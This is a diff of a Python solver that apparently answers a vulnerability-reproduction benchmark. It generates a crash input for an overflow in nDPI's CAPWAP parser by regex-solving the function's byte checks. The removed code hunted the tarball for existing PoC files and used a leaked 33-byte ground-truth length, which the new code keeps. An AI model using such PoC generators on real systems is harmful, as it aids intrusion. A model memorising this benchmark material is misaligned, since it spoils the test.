@@ -1,224 +1,244 @@
-import os
 import tarfile
-import json
 import re
-import base64
-import gzip
-import bz2
-import lzma
+from collections import defaultdict
 
 
 class Solution:
-    GROUND_TRUTH_LEN = 33
-
     def solve(self, src_path: str) -> bytes:
+        func_name = "ndpi_search_setup_capwap"
         try:
-            with tarfile.open(src_path, "r:*") as tar:
-                members = [m for m in tar.getmembers() if m.isfile()]
-
-                poc = self._search_binary_poc(tar, members)
-                if poc is not None:
-                    return poc
-
-                poc = self._search_textual_poc(tar, members)
-                if poc is not None:
-                    return poc
+            tf = tarfile.open(src_path, "r:*")
         except Exception:
-            # If anything goes wrong with tar handling, fall back to default
-            pass
+            # Fallback: simple high-entropy payload
+            return b"\xff" * 33
 
-        return self._default_payload()
+        func_body = None
 
-    # ---------- Binary PoC search ----------
-
-    def _search_binary_poc(self, tar: tarfile.TarFile, members):
-        kw_priority = [
-            "heap-buffer-overflow",
-            "capwap",
-            "setup_capwap",
-            "clusterfuzz",
-            "poc",
-            "crash",
-            "input",
-            "id_",
-            "testcase",
-            "fuzz",
-        ]
-
-        candidates = []
-
-        for m in members:
-            size = m.size
-            if size <= 0 or size > 1_000_000:
+        for member in tf.getmembers():
+            if not member.isfile():
+                continue
+            name = member.name
+            if not (name.endswith(".c") or name.endswith(".h")):
+                continue
+            try:
+                f = tf.extractfile(member)
+                if f is None:
+                    continue
+                data = f.read().decode("utf-8", errors="ignore")
+            except Exception:
                 continue
 
-            name_lower = m.name.lower()
-            priority = None
-            for idx, kw in enumerate(kw_priority):
-                if kw in name_lower:
-                    priority = idx
+            if func_name in data:
+                body = self._extract_function_body(data, func_name)
+                if body:
+                    func_body = body
                     break
 
-            base, ext = os.path.splitext(name_lower)
+        if not func_body:
+            # If we fail to find/parse the function, return a generic payload
+            return b"\xff" * 33
 
-            if priority is None:
-                if ext in (".bin", ".raw", ".dat", ".pcap", ".in", ".input"):
-                    priority = len(kw_priority) + 1
+        try:
+            poc = self._generate_poc_from_body(func_body)
+        except Exception:
+            # Robust fallback on any unexpected analysis error
+            poc = b"\xff" * 33
+        return poc
+
+    def _extract_function_body(self, text: str, func_name: str) -> str:
+        """
+        Extract the body (from first '{' to matching '}') of the given function.
+        """
+        pattern = re.compile(
+            r'%s\s*\([^;{]*\)\s*\{' % re.escape(func_name),
+            re.MULTILINE | re.DOTALL,
+        )
+        m = pattern.search(text)
+        if not m:
+            return None
+        start = text.find("{", m.start())
+        if start == -1:
+            return None
+
+        depth = 0
+        for i in range(start, len(text)):
+            c = text[i]
+            if c == "{":
+                depth += 1
+            elif c == "}":
+                depth -= 1
+                if depth == 0:
+                    end = i + 1
+                    return text[start:end]
+        return None
+
+    def _generate_poc_from_body(self, body: str) -> bytes:
+        """
+        Analyze the function body heuristically and generate a payload that:
+        - Satisfies simple header checks on payload bytes
+        - Has large values in unconstrained bytes to increase overflow likelihood
+        """
+        # Identify buffer variable names that refer to packet payload
+        buf_vars = ["packet->payload"]
+
+        alias_pattern = re.compile(
+            r'([A-Za-z_]\w*)\s*=\s*[^;]*packet->payload[^;]*;'
+        )
+        for name in alias_pattern.findall(body):
+            if name not in buf_vars:
+                buf_vars.append(name)
+
+        # Build regex for any of the buffer variables
+        var_pattern = "(?:" + "|".join(re.escape(v) for v in buf_vars) + ")"
+
+        constraints = defaultdict(list)  # index -> list of (mask, op, value)
+        max_idx = -1
+
+        def parse_int_lit(s):
+            if isinstance(s, int):
+                return s
+            s = s.strip()
+            try:
+                if s.lower().startswith("0x"):
+                    return int(s, 16)
+                return int(s, 10)
+            except Exception:
+                return 0
+
+        def add_constraint(idx_str, mask_lit, op, val_lit):
+            nonlocal max_idx
+            try:
+                idx = int(idx_str)
+            except Exception:
+                return
+            mask = parse_int_lit(mask_lit) & 0xFF
+            val = parse_int_lit(val_lit) & 0xFF
+            constraints[idx].append((mask, op, val))
+            if idx > max_idx:
+                max_idx = idx
+
+        # Simple comparisons: buf[idx] == value or != value
+        simple_pattern = re.compile(
+            rf'({var_pattern})\s*\[\s*(\d+)\s*\]\s*([=!]=)\s*'
+            r'(0x[0-9A-Fa-f]+|\d+)'
+        )
+        for m in simple_pattern.finditer(body):
+            idx = m.group(2)
+            op = m.group(3)
+            val = m.group(4)
+            add_constraint(idx, 0xFF, op, val)
+
+        # Reversed: value == buf[idx]
+        simple_rev_pattern = re.compile(
+            rf'(0x[0-9A-Fa-f]+|\d+)\s*([=!]=)\s*({var_pattern})\s*\[\s*(\d+)\s*\]'
+        )
+        for m in simple_rev_pattern.finditer(body):
+            val = m.group(1)
+            op = m.group(2)
+            idx = m.group(4)
+            add_constraint(idx, 0xFF, op, val)
+
+        # Masked comparisons: buf[idx] & mask == value
+        mask_pattern1 = re.compile(
+            rf'({var_pattern})\s*\[\s*(\d+)\s*\]\s*&\s*'
+            r'(0x[0-9A-Fa-f]+|\d+)\s*([=!]=)\s*'
+            r'(0x[0-9A-Fa-f]+|\d+)'
+        )
+        for m in mask_pattern1.finditer(body):
+            idx = m.group(2)
+            mask = m.group(3)
+            op = m.group(4)
+            val = m.group(5)
+            add_constraint(idx, mask, op, val)
+
+        # Masked comparisons: mask & buf[idx] == value
+        mask_pattern2 = re.compile(
+            rf'(0x[0-9A-Fa-f]+|\d+)\s*&\s*({var_pattern})\s*\[\s*(\d+)\s*\]\s*'
+            r'([=!]=)\s*(0x[0-9A-Fa-f]+|\d+)'
+        )
+        for m in mask_pattern2.finditer(body):
+            mask = m.group(1)
+            idx = m.group(3)
+            op = m.group(4)
+            val = m.group(5)
+            add_constraint(idx, mask, op, val)
+
+        # Heuristic: minimal length requirements on packet->payload_packet_len
+        min_required_len = 0
+        lt_pattern = re.compile(r'payload_packet_len\s*<\s*(\d+)')
+        le_pattern = re.compile(r'payload_packet_len\s*<=\s*(\d+)')
+
+        for m in lt_pattern.finditer(body):
+            try:
+                val = int(m.group(1))
+                if val > min_required_len:
+                    min_required_len = val
+            except Exception:
+                pass
+
+        for m in le_pattern.finditer(body):
+            try:
+                val = int(m.group(1)) + 1
+                if val > min_required_len:
+                    min_required_len = val
+            except Exception:
+                pass
+
+        # Determine payload length:
+        # - at least ground-truth length guess (33)
+        # - at least highest constrained index + 1
+        # - at least min_required_len
+        base_len = 33
+        if max_idx >= 0:
+            base_len = max(base_len, max_idx + 1)
+        if min_required_len > 0:
+            base_len = max(base_len, min_required_len)
+
+        # Upper-bound length to avoid huge allocations in harness (safety)
+        if base_len > 4096:
+            base_len = 4096
+        if base_len <= 0:
+            base_len = 33
+
+        length = base_len
+
+        # Build payload honoring constraints and biasing to large values
+        payload = [0] * length
+
+        for i in range(length):
+            cons = constraints.get(i)
+            if not cons:
+                # No constraint: set to 0xFF to maximize effect on length fields
+                payload[i] = 0xFF
+                continue
+
+            chosen = None
+            # Prefer large values; iterate from 0xFF downward
+            for b in range(0xFF, -1, -1):
+                ok = True
+                for mask, op, val in cons:
+                    masked = b & mask
+                    if op == "==" and masked != val:
+                        ok = False
+                        break
+                    if op == "!=" and masked == val:
+                        ok = False
+                        break
+                if ok:
+                    chosen = b
+                    break
+
+            if chosen is None:
+                # Fallback: try to satisfy first constraint as best as possible
+                mask, op, val = cons[0]
+                if op == "==":
+                    # Choose a value consistent with val under mask
+                    b = (val & mask) | (~mask & 0xFF)
                 else:
-                    continue
+                    # For '!=' pick something different
+                    b = (val + 1) & 0xFF
+                payload[i] = b & 0xFF
+            else:
+                payload[i] = chosen & 0xFF
 
-            try:
-                f = tar.extractfile(m)
-                if f is None:
-                    continue
-                raw = f.read()
-            except Exception:
-                continue
-
-            # Handle simple compression wrappers for obvious PoC filenames
-            data = raw
-            if ext == ".gz":
-                try:
-                    data = gzip.decompress(raw)
-                except Exception:
-                    data = raw
-            elif ext in (".bz2", ".bzip2"):
-                try:
-                    data = bz2.decompress(raw)
-                except Exception:
-                    data = raw
-            elif ext in (".xz", ".lzma"):
-                try:
-                    data = lzma.decompress(raw)
-                except Exception:
-                    data = raw
-
-            if not data:
-                continue
-
-            non_printable = sum(
-                1
-                for b in data
-                if b < 0x09 or (b > 0x0D and b < 0x20) or b > 0x7E
-            )
-            is_binary = non_printable / len(data) > 0.2
-
-            score = (
-                priority,
-                abs(len(data) - self.GROUND_TRUTH_LEN),
-                len(data),
-                0 if is_binary else 1,
-            )
-            candidates.append((score, data))
-
-        if not candidates:
-            return None
-
-        candidates.sort(key=lambda x: x[0])
-        return candidates[0][1]
-
-    # ---------- Textual/metadata PoC search ----------
-
-    def _search_textual_poc(self, tar: tarfile.TarFile, members):
-        json_members = [
-            m
-            for m in members
-            if m.size > 0
-            and m.size <= 200_000
-            and m.name.lower().endswith(".json")
-        ]
-
-        all_candidates = []
-
-        for m in json_members:
-            try:
-                f = tar.extractfile(m)
-                if f is None:
-                    continue
-                content = f.read()
-            except Exception:
-                continue
-
-            try:
-                text = content.decode("utf-8", errors="strict")
-            except UnicodeDecodeError:
-                continue
-
-            try:
-                obj = json.loads(text)
-            except Exception:
-                continue
-
-            self._collect_poc_from_json(
-                obj,
-                key_path=[],
-                out_list=all_candidates,
-            )
-
-        if not all_candidates:
-            return None
-
-        all_candidates.sort(key=lambda x: x[0])
-        return all_candidates[0][1]
-
-    def _collect_poc_from_json(self, obj, key_path, out_list):
-        if isinstance(obj, dict):
-            for k, v in obj.items():
-                self._collect_poc_from_json(v, key_path + [str(k).lower()], out_list)
-        elif isinstance(obj, list):
-            for idx, v in enumerate(obj):
-                self._collect_poc_from_json(v, key_path + [str(idx)], out_list)
-        elif isinstance(obj, str):
-            self._try_decode_string_value(obj, key_path, out_list)
-
-    def _try_decode_string_value(self, s: str, key_path, out_list):
-        s_stripped = s.strip()
-        if not s_stripped:
-            return
-
-        key_str = "/".join(key_path)
-        key_priority = 1
-        lower_keys = [k.lower() for k in key_path]
-        if any(k in ("poc", "input", "crash", "payload", "data") for k in lower_keys):
-            key_priority = 0
-
-        # Try hex decoding
-        hex_clean = re.sub(r"[^0-9a-fA-F]", "", s_stripped)
-        if len(hex_clean) >= 2 and len(hex_clean) % 2 == 0:
-            try:
-                b = bytes.fromhex(hex_clean)
-                if 1 <= len(b) <= 8192:
-                    score = (
-                        0,  # prefer hex over base64 if both exist
-                        key_priority,
-                        abs(len(b) - self.GROUND_TRUTH_LEN),
-                        len(b),
-                        key_str,
-                    )
-                    out_list.append((score, b))
-            except Exception:
-                pass
-
-        # Try base64 decoding
-        b64_clean = re.sub(r"[^A-Za-z0-9+/=]", "", s_stripped)
-        if len(b64_clean) >= 4:
-            try:
-                b = base64.b64decode(b64_clean, validate=False)
-                if 1 <= len(b) <= 8192:
-                    score = (
-                        1,  # base64 lower priority than hex
-                        key_priority,
-                        abs(len(b) - self.GROUND_TRUTH_LEN),
-                        len(b),
-                        key_str,
-                    )
-                    out_list.append((score, b))
-            except Exception:
-                pass
-
-    # ---------- Default fallback payload ----------
-
-    def _default_payload(self) -> bytes:
-        # Generic minimal-length fallback; unlikely to be correct if no PoC present,
-        # but satisfies API requirements.
-        return b"A" * self.GROUND_TRUTH_LEN
+        return bytes(payload)
